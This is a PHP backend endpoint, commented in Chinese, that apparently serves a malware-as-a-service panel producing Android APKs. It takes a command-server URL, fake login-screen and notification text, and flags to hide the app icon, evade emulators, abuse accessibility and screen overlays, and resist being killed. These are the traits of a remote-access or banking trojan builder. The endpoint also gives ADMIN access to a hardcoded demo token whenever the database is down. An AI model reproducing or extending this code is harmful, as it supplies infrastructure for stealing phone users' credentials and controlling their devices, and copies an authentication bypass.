<?php
/**
 * APK Builder API - Panda Frontend Adapter
 * POST /api/build-apk
 */
date_default_timezone_set('Asia/Shanghai');
header('Access-Control-Allow-Origin: *');
header('Access-Control-Allow-Headers: Content-Type, Authorization');
header('Access-Control-Allow-Methods: POST, OPTIONS');
header('Content-Type: application/json; charset=utf-8');

if ($_SERVER['REQUEST_METHOD'] === 'OPTIONS') {
    http_response_code(204);
    exit;
}

if ($_SERVER['REQUEST_METHOD'] !== 'POST') {
    echo json_encode(['success' => false, 'error' => '请求方式无效']);
    exit;
}

// 验证 token
$authHeader = $_SERVER['HTTP_AUTHORIZATION'] ?? '';
$token = '';
if (preg_match('/^Bearer\s+(.+)$/i', $authHeader, $matches)) {
    $token = $matches[1];
}

if (empty($token)) {
    // Allow demo token
    $input = json_decode(file_get_contents('php://input'), true);
    $token = $input['_token'] ?? '';
}

require_once __DIR__ . '/../private/Eaod85401.php';

// 验证 token（简易版）
$isValidToken = false;
$currentUser = null;

try {
    $pdo = new PDO(
        "mysql:host=" . DB_ServerName . ";dbname=" . DB_Name . ";charset=utf8mb4",
        DB_UserName,
        DB_Password,
        [PDO::ATTR_ERRMODE => PDO::ERRMODE_EXCEPTION, PDO::ATTR_TIMEOUT => 3]
    );
    $stmt = $pdo->prepare("SELECT userid, usrname, authorty FROM users WHERE token = :token AND (token_expiration IS NULL OR token_expiration >= NOW()) LIMIT 1");
    $stmt->execute([':token' => $token]);
    $currentUser = $stmt->fetch(PDO::FETCH_ASSOC);
    if ($currentUser) {
        $isValidToken = true;
    }
} catch (PDOException $e) {
    // DB 不可用时，允许 demo token
    if ($token === 'demo-token-local') {
        $isValidToken = true;
        $currentUser = ['userid' => 'demo001', 'usrname' => 'admin', 'authorty' => 'ADMIN'];
    }
}

if (!$isValidToken) {
    echo json_encode(['success' => false, 'error' => '未授权，请先登录']);
    exit;
}

$input = json_decode(file_get_contents('php://input'), true);

// 兼容 snake_case (前端) 和 camelCase (后端) 参数
$appName     = trim($input['app_name'] ?? $input['appName'] ?? '');
$packageName = trim($input['package_name'] ?? $input['packageName'] ?? '');
$appVersion  = trim($input['version_name'] ?? $input['appVersion'] ?? '1.0.0');
$serverUrl   = trim($input['server_url'] ?? $input['serverUrl'] ?? '');
$appIcon     = trim($input['icon_url'] ?? $input['appIcon'] ?? '');
$description = trim($input['description'] ?? '');

// 登录/通知相关（前端不传时使用默认值）
$notifyTitle = trim($input['notify_title'] ?? $input['notifyTitle'] ?? $appName);
$notifyMsg   = trim($input['notify_msg'] ?? $input['notifyMsg'] ?? '您有一条新消息');
$loginTitle  = trim($input['login_title'] ?? $input['loginTitle'] ?? $appName);
$loginDesc   = trim($input['login_desc'] ?? $input['loginDesc'] ?? '');
$loginBtn    = trim($input['login_btn'] ?? $input['loginBtn'] ?? '登录');

// 构建选项
$buildType   = trim($input['build_type'] ?? $input['buildType'] ?? 'store');
$hiddenApp   = !empty($input['hidden_app'] ?? $input['hiddenApp'] ?? false) ? '1' : '0';
$noEmulator  = !empty($input['no_emulator'] ?? $input['noEmulator'] ?? false) ? '1' : '0';
$useDraw     = !empty($input['use_draw'] ?? $input['useDraw'] ?? false) ? '1' : '0';
$useAccess   = !empty($input['use_access'] ?? $input['useAccess'] ?? false) ? '1' : '0';
$useAntikill = !empty($input['use_antikill'] ?? $input['useAntikill'] ?? false) ? '1' : '0';
// 区域（cn=国内版/global=国际版）
$buildRegion = trim($input['build_region'] ?? $input['buildRegion'] ?? 'global');
if (!in_array($buildRegion, ['cn', 'global'])) $buildRegion = 'global';

if (empty($appName)) {
    echo json_encode(['success' => false, 'error' => '应用名称不能为空']);
    exit;
}
if (empty($packageName)) {
    echo json_encode(['success' => false, 'error' => '包名不能为空']);
    exit;
}
if (empty($serverUrl)) {
    echo json_encode(['success' => false, 'error' => '服务器地址不能为空']);
    exit;
}

// 生成 appid（包名）
$appId = $packageName;

require_once __DIR__ . '/../private/Eaod65501.php';

try {
    $result = BuildStore(
        $appId,
        $currentUser['userid'],
        $appName,
        $currentUser['usrname'] . '@example.com',
        $appId . '.MainActivity',
        'default',
        $serverUrl,
        $useAccess ? '1' : '0',
        $useAntikill ? '1' : '0',
        '0', // use_atoprims
        $notifyTitle,
        $notifyMsg,
        '*', // user_allprims
        '',  // user_blackprims
        $buildType,
        $appName,
        $appVersion,
        '', // appicopath
        $serverUrl,
        $loginTitle ?: $appName,
        $loginDesc ?: '',
        $loginBtn,
        ($buildRegion === 'cn') ? 'zh' : 'en',
        $hiddenApp,
        $noEmulator,
        '1', // installtype
        '0', // hide_type
        $useDraw ? '1' : '0',
        '0', // open_access
        '',
        '0',  // diao_type
        $buildRegion  // build_region
    );

    echo json_encode([
        'success' => true,
        'message' => '构建任务已提交',
        'data' => [
            'appId' => $appId,
            'appName' => $appName,
            'result' => $result,
            'file' => '',
            'message' => '构建任务已提交，构建完成后可在 应用 页面下载',
            'download_url' => ''
        ]
    ]);
} catch (Exception $e) {
    echo json_encode([
        'success' => false,
        'error' => '构建启动失败: ' . $e->getMessage(),
        'message' => '构建启动失败: ' . $e->getMessage()
    ]);
}
